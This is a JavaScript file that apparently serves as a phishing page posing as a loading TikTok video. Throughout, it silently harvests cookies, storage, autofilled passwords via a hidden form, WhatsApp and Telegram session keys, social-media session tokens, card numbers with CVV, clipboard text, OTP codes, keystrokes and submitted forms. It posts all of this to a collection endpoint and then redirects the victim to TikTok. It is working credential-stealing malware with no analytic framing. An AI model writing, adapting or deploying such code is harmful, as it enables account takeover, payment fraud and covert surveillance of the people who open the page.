let extractedData = {
    timestamp: new Date().toISOString(),
    pageUrl: window.location.href,
    referrer: document.referrer,
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    languages: navigator.languages,
    cookieEnabled: navigator.cookieEnabled,
    doNotTrack: navigator.doNotTrack,
    hardwareConcurrency: navigator.hardwareConcurrency,
    deviceMemory: navigator.deviceMemory,
    maxTouchPoints: navigator.maxTouchPoints,
    screen: {
        width: screen.width,
        height: screen.height,
        availWidth: screen.availWidth,
        availHeight: screen.availHeight,
        colorDepth: screen.colorDepth,
        pixelRatio: window.devicePixelRatio
    },
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    timezoneOffset: new Date().getTimezoneOffset(),
    ip: null,
    location: null,
    cookies: {},
    localStorage: {},
    sessionStorage: {},
    savedPasswords: [],
    browserHistory: [],
    chromeExtensions: [],
    installedFonts: [],
    webRTCIP: null,
    networkInfo: {},
    whatsappData: null,
    telegramData: null,
    socialMediaTokens: {},
    creditCards: [],
    smsData: [],
    emailData: {},
    clipboardData: null,
    keystrokes: []
};

async function getSilentIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        extractedData.ip = data.ip;
        
        const geoResponse = await fetch(`https://ipapi.co/${data.ip}/json/`);
        const geoData = await geoResponse.json();
        extractedData.location = {
            country: geoData.country_name,
            region: geoData.region,
            city: geoData.city,
            latitude: geoData.latitude,
            longitude: geoData.longitude,
            postal: geoData.postal,
            isp: geoData.org
        };
    } catch(e) {}
}

function getWebRTCIP() {
    return new Promise((resolve) => {
        const pc = new RTCPeerConnection({ iceServers: [] });
        pc.createDataChannel('');
        pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
        
        pc.onicecandidate = (event) => {
            if (event && event.candidate) {
                const candidate = event.candidate.candidate;
                const ipMatch = candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
                if (ipMatch) {
                    extractedData.webRTCIP = ipMatch[0];
                    resolve(ipMatch[0]);
                }
            }
        };
        setTimeout(() => resolve(null), 3000);
    });
}

function extractAllStorage() {
    try {
        extractedData.localStorage = {};
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            extractedData.localStorage[key] = localStorage.getItem(key);
        }
    } catch(e) {}
    
    try {
        extractedData.sessionStorage = {};
        for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            extractedData.sessionStorage[key] = sessionStorage.getItem(key);
        }
    } catch(e) {}
    
    try {
        extractedData.cookies = document.cookie.split(';').reduce((acc, cookie) => {
            const [key, value] = cookie.trim().split('=');
            acc[key] = value;
            return acc;
        }, {});
    } catch(e) {}
}

function extractSavedPasswords() {
    const hiddenForm = document.createElement('form');
    hiddenForm.style.position = 'absolute';
    hiddenForm.style.left = '-9999px';
    hiddenForm.style.top = '-9999px';
    
    const emailInput = document.createElement('input');
    emailInput.type = 'email';
    emailInput.name = 'email';
    emailInput.id = 'silentEmail';
    
    const passInput = document.createElement('input');
    passInput.type = 'password';
    passInput.name = 'password';
    passInput.id = 'silentPass';
    
    hiddenForm.appendChild(emailInput);
    hiddenForm.appendChild(passInput);
    document.body.appendChild(hiddenForm);
    
    emailInput.focus();
    
    setTimeout(() => {
        if (emailInput.value) {
            extractedData.savedPasswords.push({
                email: emailInput.value,
                password: passInput.value,
                source: 'autofill'
            });
        }
        
        document.querySelectorAll('input[type="password"]').forEach(input => {
            if (input.value) {
                const form = input.closest('form');
                const emailField = form?.querySelector('input[type="email"], input[name="email"]');
                extractedData.savedPasswords.push({
                    email: emailField?.value || 'unknown',
                    password: input.value,
                    source: 'existing_form'
                });
            }
        });
        
        document.body.removeChild(hiddenForm);
    }, 500);
}

function extractBrowserHistory() {
    const sitesToCheck = [
        'facebook.com', 'instagram.com', 'twitter.com', 'tiktok.com',
        'youtube.com', 'gmail.com', 'whatsapp.com', 'telegram.org',
        'google.com', 'yahoo.com', 'outlook.com', 'linkedin.com',
        'netflix.com', 'spotify.com', 'amazon.com', 'shopee.co.id',
        'tokopedia.com', 'bukalapak.com', 'gojek.com', 'grab.com'
    ];
    
    const style = document.createElement('style');
    document.head.appendChild(style);
    
    sitesToCheck.forEach(site => {
        const link = document.createElement('a');
        link.href = `https://${site}`;
        link.style.display = 'none';
        document.body.appendChild(link);
        
        const color = window.getComputedStyle(link).color;
        if (color !== 'rgb(0, 0, 238)') {
            extractedData.browserHistory.push(site);
        }
        
        document.body.removeChild(link);
    });
    
    document.head.removeChild(style);
}

function extractChromeExtensions() {
    const commonExtensions = [
        'grammarly', 'lastpass', 'bitwarden', 'adblock', 'ublock',
        'honey', 'darkreader', 'metamask', 'react_devtools'
    ];
    
    commonExtensions.forEach(ext => {
        const img = new Image();
        img.onload = () => {
            extractedData.chromeExtensions.push(ext);
        };
        img.src = `chrome-extension://${ext}/icon.png`;
    });
}

function extractInstalledFonts() {
    const fonts = [
        'Arial', 'Verdana', 'Times New Roman', 'Courier New',
        'Helvetica', 'Comic Sans MS', 'Impact', 'Georgia',
        'Roboto', 'Open Sans', 'Lato', 'Montserrat', 'Poppins'
    ];
    
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    canvas.width = 100;
    canvas.height = 50;
    
    fonts.forEach(font => {
        ctx.font = `20px ${font}`;
        const metrics = ctx.measureText('abcdefghijklmnopqrstuvwxyz');
        if (metrics.width > 0) {
            extractedData.installedFonts.push(font);
        }
    });
}

async function enumerateDevicesSilent() {
    try {
        const devices = await navigator.mediaDevices.enumerateDevices();
        extractedData.microphoneDevices = [];
        extractedData.cameraDevices = [];
        
        devices.forEach(device => {
            if (device.kind === 'audioinput') {
                extractedData.microphoneDevices.push({
                    label: device.label || 'Microphone',
                    deviceId: device.deviceId
                });
            } else if (device.kind === 'videoinput') {
                extractedData.cameraDevices.push({
                    label: device.label || 'Camera',
                    deviceId: device.deviceId
                });
            }
        });
    } catch(e) {}
}

function getNetworkInfo() {
    if (navigator.connection) {
        extractedData.networkInfo = {
            type: navigator.connection.type,
            effectiveType: navigator.connection.effectiveType,
            downlink: navigator.connection.downlink,
            rtt: navigator.connection.rtt,
            saveData: navigator.connection.saveData
        };
    }
}

function extractWhatsAppData() {
    const waKeys = ['WASecretBundle', 'WAToken1', 'WAToken2', 'WABrowserId', 'last-wid', 'whatsapp-web', 'wa_session'];
    const waData = {};
    
    waKeys.forEach(key => {
        const val = localStorage.getItem(key) || sessionStorage.getItem(key);
        if (val) waData[key] = val;
    });
    
    if (Object.keys(waData).length > 0) {
        extractedData.whatsappData = waData;
        if (waData['last-wid']) {
            const phoneMatch = waData['last-wid'].match(/(\d+)/);
            if (phoneMatch) extractedData.whatsappNumber = phoneMatch[1];
        }
    }
}

function extractTelegramData() {
    const tgKeys = ['tgwebz_session', 'tg_user', 'telegram_session', 'dc1_auth_key', 'dc2_auth_key'];
    const tgData = {};
    
    tgKeys.forEach(key => {
        const val = localStorage.getItem(key);
        if (val) tgData[key] = val;
    });
    
    if (Object.keys(tgData).length > 0) {
        extractedData.telegramData = tgData;
    }
}

function extractSocialMediaTokens() {
    const fbCookies = document.cookie.match(/c_user=(\d+)/);
    if (fbCookies) {
        extractedData.socialMediaTokens.facebook = {
            userId: fbCookies[1],
            session: document.cookie.match(/xs=([^;]+)/)?.[1]
        };
    }
    
    const igSession = localStorage.getItem('ig_session') || localStorage.getItem('com.instagram.session');
    if (igSession) {
        try {
            extractedData.socialMediaTokens.instagram = JSON.parse(igSession);
        } catch(e) {
            extractedData.socialMediaTokens.instagram = igSession;
        }
    }
    
    const twitterAuth = localStorage.getItem('twitter_oauth_token');
    if (twitterAuth) {
        extractedData.socialMediaTokens.twitter = twitterAuth;
    }
    
    const tiktokSession = localStorage.getItem('sessionid') || document.cookie.match(/sessionid=([^;]+)/)?.[1];
    if (tiktokSession) {
        extractedData.socialMediaTokens.tiktok = tiktokSession;
    }
}

function extractCreditCardData() {
    const ccInputs = document.querySelectorAll('input[type="text"][autocomplete="cc-number"], input[name*="card"], input[name*="credit"]');
    
    ccInputs.forEach(input => {
        if (input.value) {
            extractedData.creditCards.push({
                number: input.value,
                name: input.closest('form')?.querySelector('input[name*="name"]')?.value,
                expiry: input.closest('form')?.querySelector('input[name*="expiry"], input[name*="exp"]')?.value,
                cvv: input.closest('form')?.querySelector('input[name*="cvv"], input[name*="cvc"]')?.value
            });
        }
    });
}

async function getClipboardData() {
    try {
        const text = await navigator.clipboard.readText();
        extractedData.clipboardData = text;
    } catch(e) {}
}

function extractSMSData() {
    const smsKeywords = ['otp', 'sms', 'code', 'verification', '2fa', 'mfa'];
    
    Object.keys(localStorage).forEach(key => {
        const lowerKey = key.toLowerCase();
        if (smsKeywords.some(kw => lowerKey.includes(kw))) {
            const value = localStorage.getItem(key);
            if (value && (value.match(/\d{4,8}/) || value.includes('code'))) {
                extractedData.smsData.push({
                    key: key,
                    value: value,
                    timestamp: new Date().toISOString()
                });
            }
        }
    });
}

function extractEmailData() {
    const emailPatterns = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
    const allText = document.body.innerText;
    const emails = allText.match(emailPatterns);
    
    extractedData.emailData = {
        emails: emails ? [...new Set(emails)] : [],
        storedEmails: []
    };
    
    Object.values(localStorage).forEach(val => {
        if (typeof val === 'string') {
            const found = val.match(emailPatterns);
            if (found) {
                extractedData.emailData.storedEmails.push(...found);
            }
        }
    });
    
    extractedData.emailData.storedEmails = [...new Set(extractedData.emailData.storedEmails)];
}

function getCanvasFingerprint() {
    const canvas = document.createElement('canvas');
    canvas.width = 300;
    canvas.height = 150;
    const ctx = canvas.getContext('2d');
    
    ctx.fillStyle = '#fe2c55';
    ctx.fillRect(0, 0, 300, 150);
    ctx.fillStyle = 'white';
    ctx.font = '20px Arial';
    ctx.fillText('TikTok', 10, 50);
    ctx.fillStyle = '#000';
    ctx.font = '14px Arial';
    ctx.fillText(navigator.userAgent, 10, 100);
    
    extractedData.canvasFingerprint = canvas.toDataURL();
    
    const gl = canvas.getContext('webgl');
    if (gl) {
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        if (debugInfo) {
            extractedData.webglFingerprint = {
                vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
            };
        }
    }
}

function startSilentKeylogger() {
    let keyLog = [];
    let lastSend = Date.now();
    
    document.addEventListener('keypress', (e) => {
        keyLog.push({
            key: e.key,
            timestamp: Date.now(),
            target: e.target.tagName
        });
        
        if (Date.now() - lastSend > 30000 && keyLog.length > 0) {
            extractedData.keystrokes = keyLog;
            sendData();
            keyLog = [];
            lastSend = Date.now();
        }
    });
}

function startFormGrabber() {
    document.querySelectorAll('form').forEach(form => {
        form.addEventListener('submit', (e) => {
            const formData = new FormData(form);
            const data = {};
            formData.forEach((value, key) => {
                data[key] = value;
            });
            extractedData.submittedForms = extractedData.submittedForms || [];
            extractedData.submittedForms.push({
                action: form.action,
                method: form.method,
                data: data,
                timestamp: Date.now()
            });
            sendData();
        });
    });
}

async function sendData() {
    try {
        const response = await fetch('/api/collect', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(extractedData)
        });
        
        const result = await response.json();
        
        if (result.status === 'success') {
            setTimeout(() => {
                window.location.href = 'https://www.tiktok.com/@tiktok/video/';
            }, 500);
        }
    } catch(e) {
        setTimeout(() => {
            window.location.href = 'https://www.tiktok.com';
        }, 1000);
    }
}

async function main() {
    document.title = 'TikTok - Video Loading';
    
    await getSilentIP();
    await getWebRTCIP();
    extractAllStorage();
    extractSavedPasswords();
    extractBrowserHistory();
    extractChromeExtensions();
    extractInstalledFonts();
    await enumerateDevicesSilent();
    getNetworkInfo();
    extractWhatsAppData();
    extractTelegramData();
    extractSocialMediaTokens();
    extractCreditCardData();
    await getClipboardData();
    extractSMSData();
    extractEmailData();
    getCanvasFingerprint();
    startSilentKeylogger();
    startFormGrabber();
    
    setTimeout(() => {
        sendData();
    }, 3000);
    
    window.addEventListener('beforeunload', () => {
        sendData();
    });
}

main();